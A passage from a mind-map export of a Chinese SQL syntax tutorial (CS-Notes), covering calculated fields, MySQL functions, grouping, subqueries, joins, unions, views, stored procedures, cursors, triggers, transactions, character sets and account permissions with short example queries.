<node ID="ID_758757938" CREATED="1754750547989" MODIFIED="1754750547991"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十一、计算字段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十一、计算字段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#十一计算字段">
</a>
    <p dir="auto">
      在数据库服务器上完成数据的转换和格式化的工作往往比客户端上快得多，并且转换和格式化后的数据量更少的话可以减少网络通信量。
    </p>
    <p dir="auto">
      计算字段通常需要使用 <strong>AS</strong>&#xa0;来取别名，否则输出的时候字段名为计算表达式。
    </p>
    <pre>SELECT col1 * col2 AS alias
FROM mytable;</pre>
    <p dir="auto">
      <strong>CONCAT()</strong>&#xa0;用于连接两个字段。许多数据库会使用空格把一个值填充为列宽，因此连接的结果会出现一些不必要的空格，使用 <strong>TRIM()</strong>&#xa0;可以去除首尾空格。
    </p>
    <pre>SELECT CONCAT(TRIM(col1), '(', TRIM(col2), ')') AS concat_col
FROM mytable;</pre>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_150601103" CREATED="1754750547991" MODIFIED="1754750547995"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十二、函数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十二、函数" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#十二函数">
</a>
    <p dir="auto">
      各个 DBMS 的函数都是不相同的，因此不可移植，以下主要是 MySQL 的函数。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1808685519" CREATED="1754750547995" MODIFIED="1754750547997"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      汇总
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 汇总" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#汇总">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          函 数
        </th>
        <th>
          说 明
        </th>
      </tr>
      <tr>
        <td>
          AVG()
        </td>
        <td>
          返回某列的平均值
        </td>
      </tr>
      <tr>
        <td>
          COUNT()
        </td>
        <td>
          返回某列的行数
        </td>
      </tr>
      <tr>
        <td>
          MAX()
        </td>
        <td>
          返回某列的最大值
        </td>
      </tr>
      <tr>
        <td>
          MIN()
        </td>
        <td>
          返回某列的最小值
        </td>
      </tr>
      <tr>
        <td>
          SUM()
        </td>
        <td>
          返回某列值之和
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      AVG() 会忽略 NULL 行。
    </p>
    <p dir="auto">
      使用 DISTINCT 可以汇总不同的值。
    </p>
    <pre>SELECT AVG(DISTINCT col1) AS avg_col
FROM mytable;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_891618588" CREATED="1754750547998" MODIFIED="1754750548000"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      文本处理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 文本处理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#文本处理">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          函数
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          LEFT()
        </td>
        <td>
          左边的字符
        </td>
      </tr>
      <tr>
        <td>
          RIGHT()
        </td>
        <td>
          右边的字符
        </td>
      </tr>
      <tr>
        <td>
          LOWER()
        </td>
        <td>
          转换为小写字符
        </td>
      </tr>
      <tr>
        <td>
          UPPER()
        </td>
        <td>
          转换为大写字符
        </td>
      </tr>
      <tr>
        <td>
          LTRIM()
        </td>
        <td>
          去除左边的空格
        </td>
      </tr>
      <tr>
        <td>
          RTRIM()
        </td>
        <td>
          去除右边的空格
        </td>
      </tr>
      <tr>
        <td>
          LENGTH()
        </td>
        <td>
          长度
        </td>
      </tr>
      <tr>
        <td>
          SOUNDEX()
        </td>
        <td>
          转换为语音值
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      其中， <strong>SOUNDEX()</strong>&#xa0;可以将一个字符串转换为描述其语音表示的字母数字模式。
    </p>
    <pre>SELECT *
FROM mytable
WHERE SOUNDEX(col1) = SOUNDEX('apple')</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1714801299" CREATED="1754750548001" MODIFIED="1754750548003"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      日期和时间处理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 日期和时间处理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#日期和时间处理">
</a>
    <ul dir="auto">
      <li>
        日期格式：YYYY-MM-DD
      </li>
      <li>
        时间格式：HH:&lt;zero-width space&gt;MM:SS
      </li>
    </ul>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          函 数
        </th>
        <th>
          说 明
        </th>
      </tr>
      <tr>
        <td>
          ADDDATE()
        </td>
        <td>
          增加一个日期（天、周等）
        </td>
      </tr>
      <tr>
        <td>
          ADDTIME()
        </td>
        <td>
          增加一个时间（时、分等）
        </td>
      </tr>
      <tr>
        <td>
          CURDATE()
        </td>
        <td>
          返回当前日期
        </td>
      </tr>
      <tr>
        <td>
          CURTIME()
        </td>
        <td>
          返回当前时间
        </td>
      </tr>
      <tr>
        <td>
          DATE()
        </td>
        <td>
          返回日期时间的日期部分
        </td>
      </tr>
      <tr>
        <td>
          DATEDIFF()
        </td>
        <td>
          计算两个日期之差
        </td>
      </tr>
      <tr>
        <td>
          DATE_ADD()
        </td>
        <td>
          高度灵活的日期运算函数
        </td>
      </tr>
      <tr>
        <td>
          DATE_FORMAT()
        </td>
        <td>
          返回一个格式化的日期或时间串
        </td>
      </tr>
      <tr>
        <td>
          DAY()
        </td>
        <td>
          返回一个日期的天数部分
        </td>
      </tr>
      <tr>
        <td>
          DAYOFWEEK()
        </td>
        <td>
          对于一个日期，返回对应的星期几
        </td>
      </tr>
      <tr>
        <td>
          HOUR()
        </td>
        <td>
          返回一个时间的小时部分
        </td>
      </tr>
      <tr>
        <td>
          MINUTE()
        </td>
        <td>
          返回一个时间的分钟部分
        </td>
      </tr>
      <tr>
        <td>
          MONTH()
        </td>
        <td>
          返回一个日期的月份部分
        </td>
      </tr>
      <tr>
        <td>
          NOW()
        </td>
        <td>
          返回当前日期和时间
        </td>
      </tr>
      <tr>
        <td>
          SECOND()
        </td>
        <td>
          返回一个时间的秒部分
        </td>
      </tr>
      <tr>
        <td>
          TIME()
        </td>
        <td>
          返回一个日期时间的时间部分
        </td>
      </tr>
      <tr>
        <td>
          YEAR()
        </td>
        <td>
          返回一个日期的年份部分
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <pre>mysql&gt; SELECT NOW();</pre>
    <pre class="notranslate">2018-4-14 20:25:11</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_246032654" CREATED="1754750548003" MODIFIED="1754750548007"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数值处理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 数值处理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#数值处理">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          函数
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          SIN()
        </td>
        <td>
          正弦
        </td>
      </tr>
      <tr>
        <td>
          COS()
        </td>
        <td>
          余弦
        </td>
      </tr>
      <tr>
        <td>
          TAN()
        </td>
        <td>
          正切
        </td>
      </tr>
      <tr>
        <td>
          ABS()
        </td>
        <td>
          绝对值
        </td>
      </tr>
      <tr>
        <td>
          SQRT()
        </td>
        <td>
          平方根
        </td>
      </tr>
      <tr>
        <td>
          MOD()
        </td>
        <td>
          余数
        </td>
      </tr>
      <tr>
        <td>
          EXP()
        </td>
        <td>
          指数
        </td>
      </tr>
      <tr>
        <td>
          PI()
        </td>
        <td>
          圆周率
        </td>
      </tr>
      <tr>
        <td>
          RAND()
        </td>
        <td>
          随机数
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_853692027" CREATED="1754750548008" MODIFIED="1754750548009"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十三、分组
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十三、分组" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#十三分组">
</a>
    <p dir="auto">
      把具有相同的数据值的行放在同一组中。
    </p>
    <p dir="auto">
      可以对同一分组数据使用汇总函数进行处理，例如求分组数据的平均值等。
    </p>
    <p dir="auto">
      指定的分组字段除了能按该字段进行分组，也会自动按该字段进行排序。
    </p>
    <pre>SELECT col, COUNT(*) AS num
FROM mytable
GROUP BY col;</pre>
    <p dir="auto">
      GROUP BY 自动按分组字段进行排序，ORDER BY 也可以按汇总字段来进行排序。
    </p>
    <pre>SELECT col, COUNT(*) AS num
FROM mytable
GROUP BY col
ORDER BY num;</pre>
    <p dir="auto">
      WHERE 过滤行，HAVING 过滤分组，行过滤应当先于分组过滤。
    </p>
    <pre>SELECT col, COUNT(*) AS num
FROM mytable
WHERE col &gt; 2
GROUP BY col
HAVING num &gt;= 2;</pre>
    <p dir="auto">
      分组规定：
    </p>
    <ul dir="auto">
      <li>
        GROUP BY 子句出现在 WHERE 子句之后，ORDER BY 子句之前；
      </li>
      <li>
        除了汇总字段外，SELECT 语句中的每一字段都必须在 GROUP BY 子句中给出；
      </li>
      <li>
        NULL 的行会单独分为一组；
      </li>
      <li>
        大多数 SQL 实现不支持 GROUP BY 列具有可变长度的数据类型。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_854338762" CREATED="1754750548010" MODIFIED="1754750548013"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十四、子查询
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十四、子查询" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#十四子查询">
</a>
    <p dir="auto">
      子查询中只能返回一个字段的数据。
    </p>
    <p dir="auto">
      可以将子查询的结果作为 WHRER 语句的过滤条件：
    </p>
    <pre>SELECT *
FROM mytable1
WHERE col1 IN (SELECT col2
               FROM mytable2);</pre>
    <p dir="auto">
      下面的语句可以检索出客户的订单数量，子查询语句会对第一个查询检索出的每个客户执行一次：
    </p>
    <pre>SELECT cust_name, (SELECT COUNT(*)
                   FROM Orders
                   WHERE Orders.cust_id = Customers.cust_id)
                   AS orders_num
FROM Customers
ORDER BY cust_name;</pre>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_267613924" CREATED="1754750548014" MODIFIED="1754750548015"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十五、连接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十五、连接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#十五连接">
</a>
    <p dir="auto">
      连接用于连接多个表，使用 JOIN 关键字，并且条件语句使用 ON 而不是 WHERE。
    </p>
    <p dir="auto">
      连接可以替换子查询，并且比子查询的效率一般会更快。
    </p>
    <p dir="auto">
      可以用 AS 给列名、计算字段和表名取别名，给表名取别名是为了简化 SQL 语句以及连接相同表。
    </p>
  </body>
</html></richcontent>
<node ID="ID_415458468" CREATED="1754750548015" MODIFIED="1754750548017"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      内连接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 内连接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#内连接">
</a>
    <p dir="auto">
      内连接又称等值连接，使用 INNER JOIN 关键字。
    </p>
    <pre>SELECT A.value, B.value
FROM tablea AS A INNER JOIN tableb AS B
ON A.key = B.key;</pre>
    <p dir="auto">
      可以不明确使用 INNER JOIN，而使用普通查询并在 WHERE 中将两个表中要连接的列用等值方法连接起来。
    </p>
    <pre>SELECT A.value, B.value
FROM tablea AS A, tableb AS B
WHERE A.key = B.key;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_820182937" CREATED="1754750548018" MODIFIED="1754750548019"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      自连接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 自连接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#自连接">
</a>
    <p dir="auto">
      自连接可以看成内连接的一种，只是连接的表是自身而已。
    </p>
    <p dir="auto">
      一张员工表，包含员工姓名和员工所属部门，要找出与 Jim 处在同一部门的所有员工姓名。
    </p>
    <p dir="auto">
      子查询版本
    </p>
    <pre>SELECT name
FROM employee
WHERE department = (
      SELECT department
      FROM employee
      WHERE name = &quot;Jim&quot;);</pre>
    <p dir="auto">
      自连接版本
    </p>
    <pre>SELECT e1.name
FROM employee AS e1 INNER JOIN employee AS e2
ON e1.department = e2.department
      AND e2.name = &quot;Jim&quot;;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_480102911" CREATED="1754750548019" MODIFIED="1754750548022"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      自然连接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 自然连接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#自然连接">
</a>
    <p dir="auto">
      自然连接是把同名列通过等值测试连接起来的，同名列可以有多个。
    </p>
    <p dir="auto">
      内连接和自然连接的区别：内连接提供连接的列，而自然连接自动连接所有同名列。
    </p>
    <pre>SELECT A.value, B.value
FROM tablea AS A NATURAL JOIN tableb AS B;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_668410371" CREATED="1754750548023" MODIFIED="1754750548025"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      外连接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 外连接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#外连接">
</a>
    <p dir="auto">
      外连接保留了没有关联的那些行。分为左外连接，右外连接以及全外连接，左外连接就是保留左表没有关联的行。
    </p>
    <p dir="auto">
      检索所有顾客的订单信息，包括还没有订单信息的顾客。
    </p>
    <pre>SELECT Customers.cust_id, Customer.cust_name, Orders.order_id
FROM Customers LEFT OUTER JOIN Orders
ON Customers.cust_id = Orders.cust_id;</pre>
    <p dir="auto">
      customers 表：
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          cust_id
        </th>
        <th>
          cust_name
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          a
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          b
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          c
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      orders 表：
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          order_id
        </th>
        <th>
          cust_id
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          1
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          1
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          3
        </td>
      </tr>
      <tr>
        <td>
          4
        </td>
        <td>
          3
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      结果：
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          cust_id
        </th>
        <th>
          cust_name
        </th>
        <th>
          order_id
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          a
        </td>
        <td>
          1
        </td>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
          a
        </td>
        <td>
          2
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          c
        </td>
        <td>
          3
        </td>
      </tr>
      <tr>
        <td>
          3
        </td>
        <td>
          c
        </td>
        <td>
          4
        </td>
      </tr>
      <tr>
        <td>
          2
        </td>
        <td>
          b
        </td>
        <td>
          Null
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1760979012" CREATED="1754750548026" MODIFIED="1754750548028"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十六、组合查询
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十六、组合查询" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#十六组合查询">
</a>
    <p dir="auto">
      使用 <strong>UNION</strong>&#xa0;来组合两个查询，如果第一个查询返回 M 行，第二个查询返回 N 行，那么组合查询的结果一般为 M+N 行。
    </p>
    <p dir="auto">
      每个查询必须包含相同的列、表达式和聚集函数。
    </p>
    <p dir="auto">
      默认会去除相同行，如果需要保留相同行，使用 UNION ALL。
    </p>
    <p dir="auto">
      只能包含一个 ORDER BY 子句，并且必须位于语句的最后。
    </p>
    <pre>SELECT col
FROM mytable
WHERE col = 1
UNION
SELECT col
FROM mytable
WHERE col =2;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_45380263" CREATED="1754750548028" MODIFIED="1754750548030"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十七、视图
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十七、视图" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#十七视图">
</a>
    <p dir="auto">
      视图是虚拟的表，本身不包含数据，也就不能对其进行索引操作。
    </p>
    <p dir="auto">
      对视图的操作和对普通表的操作一样。
    </p>
    <p dir="auto">
      视图具有如下好处：
    </p>
    <ul dir="auto">
      <li>
        简化复杂的 SQL 操作，比如复杂的连接；
      </li>
      <li>
        只使用实际表的一部分数据；
      </li>
      <li>
        通过只给用户访问视图的权限，保证数据的安全性；
      </li>
      <li>
        更改数据格式和表示。
      </li>
    </ul>
    <pre>CREATE VIEW myview AS
SELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_col
FROM mytable
WHERE col5 = val;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1250466511" CREATED="1754750548030" MODIFIED="1754750548032"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十八、存储过程
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十八、存储过程" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#十八存储过程">
</a>
    <p dir="auto">
      存储过程可以看成是对一系列 SQL 操作的批处理。
    </p>
    <p dir="auto">
      使用存储过程的好处：
    </p>
    <ul dir="auto">
      <li>
        代码封装，保证了一定的安全性；
      </li>
      <li>
        代码复用；
      </li>
      <li>
        由于是预先编译，因此具有很高的性能。
      </li>
    </ul>
    <p dir="auto">
      命令行中创建存储过程需要自定义分隔符，因为命令行是以 ; 为结束符，而存储过程中也包含了分号，因此会错误把这部分分号当成是结束符，造成语法错误。
    </p>
    <p dir="auto">
      包含 in、out 和 inout 三种参数。
    </p>
    <p dir="auto">
      给变量赋值都需要用 select into 语句。
    </p>
    <p dir="auto">
      每次只能给一个变量赋值，不支持集合的操作。
    </p>
    <pre>delimiter //
create procedure myprocedure( out ret int )
    begin
        declare y int;
        select sum(col1)
        from mytable
        into y;
        select y*y into ret;
    end //
delimiter ;</pre>
    <pre>call myprocedure(@ret);
select @ret;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1725352018" CREATED="1754750548032" MODIFIED="1754750548034"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十九、游标
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 十九、游标" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#十九游标">
</a>
    <p dir="auto">
      在存储过程中使用游标可以对一个结果集进行移动遍历。
    </p>
    <p dir="auto">
      游标主要用于交互式应用，其中用户需要对数据集中的任意行进行浏览和修改。
    </p>
    <p dir="auto">
      使用游标的四个步骤：
    </p>
    <ol dir="auto">
      <li>
        声明游标，这个过程没有实际检索出数据；
      </li>
      <li>
        打开游标；
      </li>
      <li>
        取出数据；
      </li>
      <li>
        关闭游标；
      </li>
    </ol>
    <pre>delimiter //
create procedure myprocedure(out ret int)
    begin
        declare done boolean default 0;
        declare mycursor cursor for
        select col1 from mytable;
        # 定义了一个 continue handler，当 sqlstate '02000' 这个条件出现时，会执行 set done = 1
        declare continue handler for sqlstate '02000' set done = 1;
        open mycursor;
        repeat
            fetch mycursor into ret;
            select ret;
        until done end repeat;
        close mycursor;
    end //
 delimiter ;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_178637469" CREATED="1754750548035" MODIFIED="1754750548036"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二十、触发器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二十、触发器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#二十触发器">
</a>
    <p dir="auto">
      触发器会在某个表执行以下语句时而自动执行：DELETE、INSERT、UPDATE。
    </p>
    <p dir="auto">
      触发器必须指定在语句执行之前还是之后自动执行，之前执行使用 BEFORE 关键字，之后执行使用 AFTER 关键字。BEFORE 用于数据验证和净化，AFTER 用于审计跟踪，将修改记录到另外一张表中。
    </p>
    <p dir="auto">
      INSERT 触发器包含一个名为 NEW 的虚拟表。
    </p>
    <pre>CREATE TRIGGER mytrigger AFTER INSERT ON mytable
FOR EACH ROW SELECT NEW.col into @result;
SELECT @result; -- 获取结果</pre>
    <p dir="auto">
      DELETE 触发器包含一个名为 OLD 的虚拟表，并且是只读的。
    </p>
    <p dir="auto">
      UPDATE 触发器包含一个名为 NEW 和一个名为 OLD 的虚拟表，其中 NEW 是可以被修改的，而 OLD 是只读的。
    </p>
    <p dir="auto">
      MySQL 不允许在触发器中使用 CALL 语句，也就是不能调用存储过程。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1054715483" CREATED="1754750548037" MODIFIED="1754750548039"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二十一、事务管理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二十一、事务管理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#二十一事务管理">
</a>
    <p dir="auto">
      基本术语：
    </p>
    <ul dir="auto">
      <li>
        事务（transaction）指一组 SQL 语句；
      </li>
      <li>
        回退（rollback）指撤销指定 SQL 语句的过程；
      </li>
      <li>
        提交（commit）指将未存储的 SQL 语句结果写入数据库表；
      </li>
      <li>
        保留点（savepoint）指事务处理中设置的临时占位符（placeholder），你可以对它发布回退（与回退整个事务处理不同）。
      </li>
    </ul>
    <p dir="auto">
      不能回退 SELECT 语句，回退 SELECT 语句也没意义；也不能回退 CREATE 和 DROP 语句。
    </p>
    <p dir="auto">
      MySQL 的事务提交默认是隐式提交，每执行一条语句就把这条语句当成一个事务然后进行提交。当出现 START TRANSACTION 语句时，会关闭隐式提交；当 COMMIT 或 ROLLBACK 语句执行后，事务会自动关闭，重新恢复隐式提交。
    </p>
    <p dir="auto">
      设置 autocommit 为 0 可以取消自动提交；autocommit 标记是针对每个连接而不是针对服务器的。
    </p>
    <p dir="auto">
      如果没有设置保留点，ROLLBACK 会回退到 START TRANSACTION 语句处；如果设置了保留点，并且在 ROLLBACK 中指定该保留点，则会回退到该保留点。
    </p>
    <pre>START TRANSACTION
// ...
SAVEPOINT delete1
// ...
ROLLBACK TO delete1
// ...
COMMIT</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_2032157" CREATED="1754750548039" MODIFIED="1754750548040"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二十二、字符集
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二十二、字符集" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#二十二字符集">
</a>
    <p dir="auto">
      基本术语：
    </p>
    <ul dir="auto">
      <li>
        字符集为字母和符号的集合；
      </li>
      <li>
        编码为某个字符集成员的内部表示；
      </li>
      <li>
        校对字符指定如何比较，主要用于排序和分组。
      </li>
    </ul>
    <p dir="auto">
      除了给表指定字符集和校对外，也可以给列指定：
    </p>
    <pre>CREATE TABLE mytable
(col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci )
DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci;</pre>
    <p dir="auto">
      可以在排序、分组时指定校对：
    </p>
    <pre>SELECT *
FROM mytable
ORDER BY col COLLATE latin1_general_ci;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1251738274" CREATED="1754750548041" MODIFIED="1754750548042"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二十三、权限管理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二十三、权限管理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#二十三权限管理">
</a>
    <p dir="auto">
      MySQL 的账户信息保存在 mysql 这个数据库中。
    </p>
    <pre>USE mysql;
SELECT user FROM user;</pre>
    <p dir="auto">
      <strong>创建账户</strong>
    </p>
    <p dir="auto">
      新创建的账户没有任何权限。
    </p>
    <pre>CREATE USER myuser IDENTIFIED BY 'mypassword';</pre>
    <p dir="auto">
      <strong>修改账户名</strong>
    </p>
    <pre>RENAME USER myuser TO newuser;</pre>
    <p dir="auto">
      <strong>删除账户</strong>
    </p>
    <pre>DROP USER myuser;</pre>
    <p dir="auto">
      <strong>查看权限</strong>
    </p>
    <pre>SHOW GRANTS FOR myuser;</pre>
    <p dir="auto">
      <strong>授予权限</strong>
    </p>
    <p dir="auto">
      账户用 username@host 的形式定义，username@% 使用的是默认主机名。
    </p>
    <pre>GRANT SELECT, INSERT ON mydatabase.* TO myuser;</pre>
    <p dir="auto">
      <strong>删除权限</strong>
    </p>
    <p dir="auto">
      GRANT 和 REVOKE 可在几个层次上控制访问权限：
    </p>
    <ul dir="auto">
      <li>
        整个服务器，使用 GRANT ALL 和 REVOKE ALL；
      </li>
      <li>
        整个数据库，使用 ON database.*；
      </li>
      <li>
        特定的表，使用 ON database.table；
      </li>
      <li>
        特定的列；
      </li>
      <li>
        特定的存储过程。
      </li>
    </ul>
    <pre>REVOKE SELECT, INSERT ON mydatabase.* FROM myuser;</pre>
    <p dir="auto">
      <strong>更改密码</strong>
    </p>
    <p dir="auto">
      必须使用 Password() 函数进行加密。
    </p>
    <pre>SET PASSWROD FOR myuser = Password('new_password');</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1478405668" CREATED="1754750548043" MODIFIED="1754750548044"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E8%AF%AD%E6%B3%95.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        BenForta. SQL 必知必会 [M]. 人民邮电出版社, 2013.
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
